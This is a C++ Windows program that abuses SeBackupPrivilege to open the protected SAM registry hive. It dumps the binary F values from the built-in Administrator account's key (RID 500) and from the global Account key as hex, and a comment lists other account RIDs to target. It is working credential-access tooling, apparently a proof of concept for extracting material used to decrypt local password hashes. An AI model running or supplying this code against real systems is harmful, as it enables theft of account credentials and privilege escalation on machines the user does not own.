#include <windows.h>
#include <winreg.h>
#include <imagehlp.h>
#include <iostream>
#include <iomanip>
#include <vector>

#pragma comment(lib, "advapi32")
#pragma comment(lib, "imagehlp")

bool enablePrivilege(LPCWSTR privilegeName) {
    HANDLE token;
    TOKEN_PRIVILEGES tp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        std::cerr << "[-] Failed to open process token" << std::endl;
        return false;
    }

    LUID luid;
    if (!LookupPrivilegeValueW(nullptr, privilegeName, &luid)) {
        std::cerr << "[-] Failed to lookup privilege value" << std::endl;
        CloseHandle(token);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
        std::cerr << "[-] Failed to adjust token privileges" << std::endl;
        CloseHandle(token);
        return false;
    }

    CloseHandle(token);
    return true;
}

bool readRegistryBinaryValue(const std::wstring& keyPath, const std::wstring& valueName, std::vector<BYTE>& outData) {
    HKEY hKey = nullptr;

    LONG status = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        keyPath.c_str(),
        REG_OPTION_BACKUP_RESTORE,
        KEY_QUERY_VALUE,
        &hKey
    );

    if (status != ERROR_SUCCESS) {
        std::wcerr << L"[-] RegOpenKeyExW failed (0x" << std::hex << status << L")" << std::endl;
        return false;
    }

    DWORD type = 0;
    DWORD dataSize = 0;
    status = RegQueryValueExW(hKey, valueName.c_str(), nullptr, &type, nullptr, &dataSize);
    if (status != ERROR_SUCCESS) {
        std::wcerr << L"[-] RegQueryValueExW (size) failed: 0x" << std::hex << status << std::endl;
        RegCloseKey(hKey);
        return false;
    }

    outData.resize(dataSize);
    status = RegQueryValueExW(hKey, valueName.c_str(), nullptr, &type, outData.data(), &dataSize);
    if (status != ERROR_SUCCESS) {
        std::wcerr << L"[-] RegQueryValueExW (data) failed: 0x" << std::hex << status << std::endl;
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}

int wmain() {
    if (!enablePrivilege(SE_BACKUP_NAME)) {
        std::wcerr << L"[-] Failed to enable SeBackupPrivilege" << std::endl;
        return 1;
    }

    // Option 1: For user-specific key
    std::wstring userKeyPath = L"SAM\\SAM\\Domains\\Account\\Users\\000001F4";  // RID 500 000001F4 RID 1001 000003E9 RID 1002 000003EA and so on
    std::vector<BYTE> fvalue_user;

    if (readRegistryBinaryValue(userKeyPath, L"F", fvalue_user)) {
        std::wcout << L"[+] F value from user key (" << fvalue_user.size() << L" bytes): ";
        for (BYTE b : fvalue_user) {
            std::wcout << std::hex << std::setw(2) << std::setfill(L'0') << (int)b;
        }
        std::wcout << std::endl;
    }

    // Option 2: For global Account key
    std::wstring accountKeyPath = L"SAM\\SAM\\Domains\\Account";
    std::vector<BYTE> fvalue_global;

    if (readRegistryBinaryValue(accountKeyPath, L"F", fvalue_global)) {
        std::wcout << L"[+] F value from Account key (" << fvalue_global.size() << L" bytes): ";
        for (BYTE b : fvalue_global) {
            std::wcout << std::hex << std::setw(2) << std::setfill(L'0') << (int)b;
        }
        std::wcout << std::endl;
    }

    return 0;
}
